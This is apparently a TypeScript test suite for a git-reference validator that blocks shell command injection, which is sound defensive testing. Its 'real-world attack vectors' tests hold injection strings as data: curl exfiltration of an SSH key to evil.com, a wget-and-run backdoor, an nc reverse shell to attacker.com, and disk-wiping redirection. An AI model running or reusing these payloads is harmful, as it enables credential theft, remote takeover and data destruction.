/**
 * Tests for git-utils - Security validation for git operations
 */

import { describe, it } from 'node:test';
import assert from 'node:assert';
import { validateGitRef } from '../../src/core/git-utils.js';

describe('validateGitRef', () => {
  describe('valid references', () => {
    it('should accept full SHA-1 hashes', () => {
      assert.doesNotThrow(() =>
        validateGitRef('a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2')
      );
    });

    it('should accept short hashes', () => {
      assert.doesNotThrow(() => validateGitRef('a1b2c3d'));
      assert.doesNotThrow(() => validateGitRef('abc123'));
      assert.doesNotThrow(() => validateGitRef('1234567890'));
    });

    it('should accept HEAD reference', () => {
      assert.doesNotThrow(() => validateGitRef('HEAD'));
    });

    it('should accept branch names', () => {
      assert.doesNotThrow(() => validateGitRef('main'));
      assert.doesNotThrow(() => validateGitRef('feature-branch'));
      assert.doesNotThrow(() => validateGitRef('feature_branch'));
      assert.doesNotThrow(() => validateGitRef('feat/new-feature'));
    });

    it('should accept tag names', () => {
      assert.doesNotThrow(() => validateGitRef('v1.0.0'));
      assert.doesNotThrow(() => validateGitRef('release-1.2.3'));
    });

    it('should accept refs with carets and tildes', () => {
      assert.doesNotThrow(() => validateGitRef('HEAD~1'));
      assert.doesNotThrow(() => validateGitRef('HEAD^'));
      assert.doesNotThrow(() => validateGitRef('main~2'));
    });
  });

  describe('invalid references - command injection attempts', () => {
    it('should reject shell command separators', () => {
      assert.throws(() => validateGitRef('abc123; rm -rf /'), /forbidden characters/);
      assert.throws(() => validateGitRef('abc123 && cat /etc/passwd'), /forbidden characters/);
      assert.throws(() => validateGitRef('abc123 | cat'), /forbidden characters/);
      assert.throws(() => validateGitRef('abc123 & background'), /forbidden characters/);
    });

    it('should reject backticks and command substitution', () => {
      assert.throws(() => validateGitRef('`whoami`'), /forbidden characters/);
      assert.throws(() => validateGitRef('$(whoami)'), /unsafe pattern/);
      assert.throws(() => validateGitRef('abc123`ls`'), /forbidden characters/);
    });

    it('should reject quotes that could break out of strings', () => {
      assert.throws(() => validateGitRef('abc"123'), /forbidden characters/);
      assert.throws(() => validateGitRef("abc'123"), /forbidden characters/);
      assert.throws(() => validateGitRef('abc\\123'), /forbidden characters/);
    });

    it('should reject file redirections', () => {
      assert.throws(() => validateGitRef('abc > /tmp/file'), /forbidden characters/);
      assert.throws(() => validateGitRef('abc < /tmp/file'), /forbidden characters/);
      assert.throws(() => validateGitRef('abc >> /tmp/file'), /forbidden characters/);
    });

    it('should reject shell variables', () => {
      assert.throws(() => validateGitRef('$USER'), /forbidden characters/);
      assert.throws(() => validateGitRef('${HOME}'), /unsafe pattern/); // Caught by early pattern check
      assert.throws(() => validateGitRef('abc$123'), /forbidden characters/);
    });

    it('should reject wildcards and globbing', () => {
      assert.throws(() => validateGitRef('abc*'), /forbidden characters/);
      assert.throws(() => validateGitRef('abc?def'), /forbidden characters/);
      assert.throws(() => validateGitRef('abc[123]'), /forbidden characters/);
    });

    it('should reject references starting with dash (flag injection)', () => {
      assert.throws(() => validateGitRef('-rf'), /unsafe pattern/);
      assert.throws(() => validateGitRef('--help'), /unsafe pattern/);
    });

    it('should reject exclamation marks (bash history)', () => {
      assert.throws(() => validateGitRef('abc!123'), /forbidden characters/);
    });

    it('should reject curly braces (brace expansion)', () => {
      assert.throws(() => validateGitRef('abc{1,2,3}'), /forbidden characters/);
    });
  });

  describe('edge cases', () => {
    it('should reject empty strings', () => {
      assert.throws(() => validateGitRef(''), /must be a non-empty string/);
      assert.throws(() => validateGitRef('   '), /cannot be empty/);
    });

    it('should reject null/undefined', () => {
      assert.throws(() => validateGitRef(null as any), /must be a non-empty string/);
      assert.throws(() => validateGitRef(undefined as any), /must be a non-empty string/);
    });

    it('should reject non-string types', () => {
      assert.throws(() => validateGitRef(123 as any), /must be a non-empty string/);
      assert.throws(() => validateGitRef({} as any), /must be a non-empty string/);
    });

    it('should reject hashes that are too short', () => {
      assert.throws(() => validateGitRef('abc'), /Invalid commit hash length/);
      assert.throws(() => validateGitRef('ab'), /Invalid commit hash length/);
    });

    it('should reject hashes that are too long', () => {
      const tooLong = 'a'.repeat(41);
      assert.throws(() => validateGitRef(tooLong), /Invalid commit hash length/);
    });

    it('should reject path traversal attempts', () => {
      assert.throws(() => validateGitRef('../etc/passwd'), /unsafe pattern/);
      assert.throws(() => validateGitRef('../../root'), /unsafe pattern/);
    });

    it('should trim whitespace', () => {
      // Should work with trimmed valid refs
      assert.doesNotThrow(() => validateGitRef('  HEAD  '));
      assert.doesNotThrow(() => validateGitRef('  abc123  '));
    });
  });

  describe('real-world attack vectors', () => {
    it('should prevent arbitrary command execution via commit hash', () => {
      // Attacker tries to inject commands via a fake commit hash
      const attacks = [
        'abc123; curl http://evil.com/steal?data=$(cat ~/.ssh/id_rsa)',
        'HEAD; wget http://malware.com/backdoor.sh -O /tmp/bd.sh && bash /tmp/bd.sh',
        'main`nc -e /bin/sh attacker.com 4444`',
        '$(curl http://evil.com/exfiltrate?data=$(ls -la))',
      ];

      for (const attack of attacks) {
        assert.throws(() => validateGitRef(attack));
      }
    });

    it('should prevent file overwrite via redirection', () => {
      const attacks = [
        'abc123 > /etc/passwd',
        'HEAD >> ~/.bashrc',
        'main < /dev/zero > /dev/sda',
      ];

      for (const attack of attacks) {
        assert.throws(() => validateGitRef(attack));
      }
    });

    it('should prevent null byte injection', () => {
      // Null bytes can truncate strings in some contexts
      assert.throws(() => validateGitRef('abc123\x00extra'), /forbidden characters/);
    });
  });
});
